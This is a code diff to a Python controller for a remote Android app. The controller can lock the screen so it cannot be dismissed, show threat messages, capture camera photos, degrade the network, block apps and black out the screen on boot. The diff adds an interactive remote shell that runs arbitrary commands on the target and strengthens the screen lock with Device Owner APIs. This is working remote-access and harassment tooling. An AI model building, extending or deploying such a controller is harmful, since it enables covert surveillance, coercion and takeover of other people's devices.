@@ -32,30 +32,55 @@ MESSAGE_DASHBOARD = [
 
 ALLOWED_IMAGE_EXTENSIONS = {".jpg", ".jpeg", ".png", ".bmp", ".webp"}
 
-# مكتبة الأصوات (مرتبة بنفس ترتيب SOUND_LIBRARY في التطبيق)
-SOUND_LIBRARY = [
-    ("Alarm", "alarm.wav"),
-    ("Siren", "siren.wav"),
-    ("Warning", "warning.wav"),
-    ("Notification", "notification.wav"),
-]
+# مكتبات الوسائط: الصوت منفصل تماماً عن الفيديو.
+# مكتبة الأصوات -> app/src/main/assets/audio/
+# مكتبة الفيديو -> app/src/main/assets/video/
+# res/raw يحتفظ فقط بالأصوات القديمة (legacy) ولا يحتوي أي ملف فيديو.
+BASE_MEDIA_DIR = os.path.join(BASE_DIR, "app", "src", "main", "assets")
+AUDIO_DIR = os.path.join(BASE_MEDIA_DIR, "audio")
+VIDEO_DIR = os.path.join(BASE_MEDIA_DIR, "video")
 
-# مجلد موارد التطبيق الذي يُقرأ منه معرض الفيديو (يتم التعرف على video_<n>.mp4)
-VIDEO_RAW_DIR = os.path.join(BASE_DIR, "app", "src", "main", "res", "raw")
+AUDIO_EXTENSIONS = {".wav", ".mp3", ".m4a", ".ogg", ".aac", ".flac", ".opus"}
+VIDEO_EXTENSIONS = {".mp4", ".webm", ".mkv", ".3gp", ".mov"}
 
 _VIDEO_NAME_RE = re.compile(r"video_(\d+)", re.IGNORECASE)
+
+_PACKAGE_NAME_RE = re.compile(r"^[A-Za-z][A-Za-z0-9_]*(\.[A-Za-z][A-Za-z0-9_]*)+$")
+
+
+def scan_audio_library():
+    """Return a sorted list of [(id, filename)] for audio files inside
+    app/src/main/assets/audio.
+
+    Only audio extensions appear; adding a new audio file to assets/audio
+    extends the library automatically. Order is the lowercased filename sort,
+    which matches the Android-side audio library so play_sound:<id> always maps
+    to the same file.
+    """
+    try:
+        names = os.listdir(AUDIO_DIR)
+    except OSError:
+        return []
+    entries = []
+    for name in names:
+        ext = os.path.splitext(name)[1].lower()
+        if ext not in AUDIO_EXTENSIONS:
+            continue
+        entries.append(name)
+    entries.sort(key=lambda n: n.lower())
+    return [(i + 1, name) for i, name in enumerate(entries)]
 
 
 def scan_video_library():
     """Return a sorted list of [(numeric_id, filename)] for files named
-    video_<n>.mp4 inside app/src/main/res/raw.
+    video_<n>.mp4 inside app/src/main/assets/video.
 
-    The numeric id matches the Android-side lookup, where play_video:<n>
-    resolves to the raw resource named video_<n>. Adding another file named
-    video_5.mp4 extends the library automatically.
+    The numeric id matches the Android-side lookup (play_video:<n> resolves to
+    assets/video/video_<n>.mp4). Adding another file named video_5.mp4 extends
+    the library automatically.
     """
     try:
-        names = os.listdir(VIDEO_RAW_DIR)
+        names = os.listdir(VIDEO_DIR)
     except OSError:
         return []
     entries = {}
@@ -312,7 +337,7 @@ class PhoneController:
             print("7. Show black screen on boot")
             print("8. Network degradation")
             print("9. Block other apps")
-            print("10. Run custom command")
+            print("10. Android Shell")
             print("11. Run script")
             print("12. Show device info")
             print("13. Capture camera photo")
@@ -362,11 +387,8 @@ class PhoneController:
                     if not self._block_app():
                         continue
                 elif choice == "10":
-                    command = input("Custom command: ").strip()
-                    if not command:
-                        print("Result: Error - custom command is empty.")
-                        continue
-                    self.send_command(f"custom:{command}")
+                    self._android_shell()
+                    continue
                 elif choice == "11":
                     if not self._run_script():
                         continue
@@ -412,22 +434,29 @@ class PhoneController:
     def _play_sound(self):
         """Send a sound from the sound library to the target for playback.
 
-        Returns True if the command was sent (a reply is expected and read by
-        the caller), False if the user went back or validation failed (no
-        command was sent, so the caller must skip the receive step).
+        The library is scanned from app/src/main/assets/audio (audio files
+        only). Returns True if the command was sent (a reply is expected and
+        read by the caller), False if the user went back or validation failed
+        (no command was sent, so the caller must skip the receive step).
         """
-        print("\n--- Available Sounds ---")
-        for i, (display_name, filename) in enumerate(SOUND_LIBRARY, start=1):
-            print(f"{i}. {display_name} ({filename})")
+        print("\n--- Sound Library ---")
+        library = scan_audio_library()
+        if not library:
+            print("No audio files found.")
+            print("Result: Error - add an audio file to app/src/main/assets/audio "
+                  "and rebuild the app to expand the library.")
+            return False
+        for sound_id, filename in library:
+            print(f"{sound_id}. {filename}")
         print("0. Back")
 
         choice = input("Choose a sound (0 to go back): ").strip()
         if choice == "0":
             return False
 
-        sound_id = _parse_int_in_range(choice, 1, len(SOUND_LIBRARY))
+        sound_id = _parse_int_in_range(choice, 1, len(library))
         if sound_id is None:
-            print(f"Result: Error - choose a number between 1 and {len(SOUND_LIBRARY)}.")
+            print(f"Result: Error - choose a number between 1 and {len(library)}.")
             return False
 
         duration_str = input("Duration in seconds: ").strip()
@@ -436,9 +465,10 @@ class PhoneController:
             print("Result: Error - duration must be an integer between 1 and 600 seconds.")
             return False
 
-        display_name, filename = SOUND_LIBRARY[sound_id - 1]
+        filename = library[sound_id - 1][1]
         send_message(self.client_socket, f"play_sound:{sound_id}:{duration}")
-        print(f"Sending sound: {display_name} ({filename}) for {duration} seconds...")
+        print(f"Sound {sound_id} selected: {filename}")
+        print(f"Sending sound ({filename}) for {duration} seconds...")
         return True
 
     def _change_wallpaper(self):
@@ -580,6 +610,11 @@ class PhoneController:
         if not package:
             print("Result: Error - package name is empty.")
             return False
+        if not _PACKAGE_NAME_RE.match(package):
+            print(f"Result: INVALID PACKAGE NAME / PACKAGE NOT FOUND: "
+                  f"'{package}' is not a valid Android package name "
+                  f"(display names are not accepted).")
+            return False
         self.send_command(f"block_app:{package}")
         return True
 
@@ -590,10 +625,12 @@ class PhoneController:
         automatically. Returns True if the command was sent, False on invalid
         input.
         """
-        print("Selected: Block screen (temporary fullscreen lock).")
-        print("  - The lock auto-expires after the requested duration (1-86400 seconds).")
-        print("  - The user can still press the back/home overview system keys "
-              "on most devices; the block is not a persistent lockdown.")
+        print("Selected: Block screen (temporary screen lock).")
+        print("  - Duration 1-86400 seconds; the lock auto-releases on expiry.")
+        print("  - If the app is a Device Owner, managed-device APIs are used "
+              "(lock task + keyguard), so Home/Overview cannot dismiss it.")
+        print("  - Otherwise it is a fullscreen app-level lock and the reply "
+              "reports the actual mode honestly.")
         duration_str = input("Duration in seconds: ").strip()
         duration = _parse_duration(duration_str)
         if duration is None:
@@ -607,17 +644,17 @@ class PhoneController:
         """Send a fullscreen video request to the target for playback.
 
         Uses the video library: any mp4 file named video_<n>.mp4 inside
-        app/src/main/res/raw. Returns True if the command was sent (a reply is
-        expected and read by the caller), False if the user went back or the
-        library is empty (no command was sent).
+        app/src/main/assets/video. Returns True if the command was sent (a
+        reply is expected and read by the caller), False if the user went back
+        or the library is empty (no command was sent).
         """
-        print("\n--- Fullscreen Video Library ---")
+        print("\n--- Video Library ---")
         library = scan_video_library()
         if not library:
             print("No videos found.")
             print("Result: Error - add a video named video_<n>.mp4 to "
-                  "app/src/main/res/raw (e.g. video_1.mp4) and rebuild the app "
-                  "to expand the library.")
+                  "app/src/main/assets/video (e.g. video_1.mp4) and rebuild "
+                  "the app to expand the library.")
             return False
         for vid, filename in library:
             print(f"{vid}. {filename}")
@@ -661,6 +698,66 @@ class PhoneController:
         self.send_command(f"show_serious_warning:{text}")
         print("Sending serious warning to the target...")
         return True
+
+    def _android_shell(self):
+        """Open an interactive Android shell session on the target.
+
+        The Controller is only the terminal interface: every command is
+        executed on ANDROID by the app's persistent shell process and the
+        output is streamed back. Commands are never interpreted as Controller
+        menu selections. Type 'exit' to return to the Control Panel.
+        """
+        print("\n==================================================")
+        print(" Android Shell")
+        print(" Target: Android Emulator")
+        print("==================================================")
+        print("Commands run on ANDROID (the device's shell), not on Windows.")
+        print("Type 'exit' to return to the Control Panel.")
+        print("")
+
+        try:
+            send_message(self.client_socket, "shell_start")
+            started = receive_message(self.client_socket)
+        except (ConnectionError, OSError, EOFError) as e:
+            print(f"Lost connection to device: {e}")
+            return
+        if not started.startswith("SHELL_SESSION_STARTED"):
+            print(f"Result: {started}")
+            return
+
+        # اعرض سياق الصلاحيات الفعلي على الهدف فوراً (هوية/JUID)
+        print(self._shell_send("id"))
+
+        while True:
+            try:
+                line = input("$ ").strip()
+            except (EOFError, KeyboardInterrupt):
+                print("\nClosing shell session...")
+                break
+            if not line:
+                continue
+            if line == "exit":
+                break
+            result = self._shell_send(line)
+            if result is None:
+                return
+            print(result)
+
+        try:
+            send_message(self.client_socket, "shell_exit")
+            print(receive_message(self.client_socket))
+        except (ConnectionError, OSError, EOFError) as e:
+            print(f"Lost connection to device: {e}")
+
+    def _shell_send(self, command):
+        """Send one command to the Android shell session and return its output."""
+        b64 = base64.b64encode(command.encode("utf-8")).decode("ascii")
+        try:
+            send_message(self.client_socket, "shell_cmd:" + b64)
+            return receive_message(self.client_socket)
+        except (ConnectionError, OSError, EOFError) as e:
+            print(f"Lost connection to device: {e}")
+            return None
 
     def _message_dashboard(self):
         """Send a predefined or custom threat message to display on the device.
